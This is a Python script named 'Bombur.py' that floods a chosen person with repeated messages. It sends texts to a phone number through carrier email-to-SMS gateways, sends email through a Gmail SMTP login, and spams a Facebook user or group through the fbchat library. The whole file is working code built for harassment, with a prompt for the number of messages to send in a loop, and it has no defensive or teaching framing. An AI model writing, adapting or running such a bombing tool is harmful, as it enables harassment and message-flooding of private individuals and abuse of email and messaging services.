#! python3
__author__ = 'KattStof'
#Bombur.py - a simple email/sms/facebook bombing script
# One Script to rule them all
import smtplib, getpass, time
from fbchat import Client
from fbchat.models import *
print("__________________")
print("   BOMBUR")
print("Email/SMS/FaceBook Bomber")
print("__________________")
print('1) SMS Bomb')
print('2) E-mail Bomb')
print('3) Facebook Bomb')
choice = input("Enter Option: ")
if choice == '1':
    mailserver = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    mailserver.ehlo()
    username = input('Enter Gmail Email Address: ')
    password = getpass.getpass()
    print("""
    1)AT&T
    2)Verizon
    3)T-Mobile
    4)Sprint
    5)VirginMobile
    6)USCellular
    7)Boost
    """)
    carrier = input('Enter Phone Carrier: ')
    number = input('Enter Phone Number: ')
    texttosend = input("Text to send: ")
    ammount = int(input('Number of texts to send: '))
    if carrier == '1':
        sendto = number + '@text.att.net'
    elif carrier == '2':
        sendto = number + '@vtext.com'
    elif carrier == '3':
        sendto = number + '@tmomail.net'
    elif carrier == '4':
        sendto = number + '@messaging.sprintpcs.com'
    elif carrier == '5':
        sendto = number + '@vmobl.com'
    elif carrier == '6':
        sendto = number + '@email.uscc.net'
    elif carrier == '7':
        sendto = number + '@myboostmobile.com'
    mailserver.login(username,password)
    for x in range(ammount):
        time.sleep(2)
        mailserver.sendmail(username, sendto, texttosend)
        print ('Sending text #', x + 1)
    print (str(ammount)," Text sent to " ,number, " successfully")
if choice == '2':
    mailserver = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    mailserver.ehlo()
    username = input('Enter Gmail Email Address: ')
    password = getpass.getpass()
    mailserver.login(username, password)
    from_email = input('Enter From Email: ')
    to_email = input('Enter Email Address To Bomb:')
    subject = input('Enter Email Subject: ')
    body = input('Enter Email Body: ')
    ammount = int(input('How Many Emails to send?: '))
    for i in range(ammount):
        print('Sending email #' + str(i + 1))
        time.sleep(2)
        mailserver.sendmail(from_email, to_email,'Subject:' + subject + '\n' + body)
    print(str(ammount),'Emails sent to', to_email, "successfully")
if choice == '3':
    fb_email = input('Enter Facebook Email ')
    fb_password = input('Enter Facebook Password ')
    client = Client(fb_email, fb_password)
    user_group = input('are you spamming user or group? ')
    if user_group.lower() == 'user':
        user_name = input('Name of user to spam ')
        users = client.searchForUsers(user_name)
        user = users[0]
        thread_id = user.uid
        message = input('What message to send ')
        ammount = int(input('How many messages to send '))
        for i in range(ammount):
            print('sending message #', i + 1)
            client.send(Message(text=message), thread_id=thread_id, thread_type=ThreadType.USER)
        print(str(ammount), ' messages sent to ', user_name, ' successfully' )
    if user_group.lower() == 'group':
        thread_id = input('Enter thread id ex: https://www.facebook.com/messages/t/xxxxx ')
        message = input('What message to send ')
        ammount = int(input('How many messages to send '))
        for i in range(ammount):
            print('sending message #', i + 1)
            client.send(Message(text=message), thread_id=thread_id, thread_type=ThreadType.GROUP)
        print(str(ammount), ' messgaes sent to group successfully ')
